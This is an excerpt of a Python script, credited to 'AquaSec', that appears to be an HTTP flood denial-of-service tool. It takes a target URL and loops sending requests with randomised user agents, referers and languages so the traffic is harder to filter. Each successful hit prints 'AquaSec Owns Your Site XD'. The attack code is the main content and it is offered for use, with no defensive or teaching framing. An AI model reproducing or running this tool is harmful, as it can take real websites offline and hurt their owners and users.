...
def usage():
    ...
    print(r"AquaSec :")
    print(r"----------------------------------------------------------------------------------------------")
    print(r"Author : s.aqua_")
    print(r"Usage: python lol.py <ur URL> ")
    print(r"Example: python lol.py [http://www.example.com]")
...
def referer_list():
    ...
    headers_referers.extend([
        f"http://www.google.com/?q={random.randint(1,100)}",
        f"http://www.bing.com/?q={random.randint(1,100)}",
        f"http://www.yahoo.com/?q={random.randint(1,100)}",
        f"http://www.facebook.com/l.php?u={url}",
        f"http://t.co/dvmfdkfdasf?q={random.randint(1,100)}",
...
def down_it():
    global flag, packet_line_counter, error_counter
    while not flag:
        try:
            headers = {
                'User-Agent': random.choice(headers_useragents),
                'Referer': random.choice(headers_referers),
                'Accept-Language': random.choice(headers_accept_language),
            ...
            try:
                with urllib.request.urlopen(req, timeout=10) as response:
                    if response.status == 200:
                        ...
                        print(f"[+] Request #{packet_line_counter} successful ----> AquaSec Owns Your Site> XD !!")
                        sys.stdout.flush()
                    else:
                        error_counter += 1
                ...
                if e.code == 500 and safe:
                    print("[!] Server error detected - stopping")
                    set_flag(1)
                    break
                continue
...
def setup():
    ...
    if not match:
        print("URL format incorrect, use http://www.example.com")
        sys.exit(1)
    host = match.group(1)
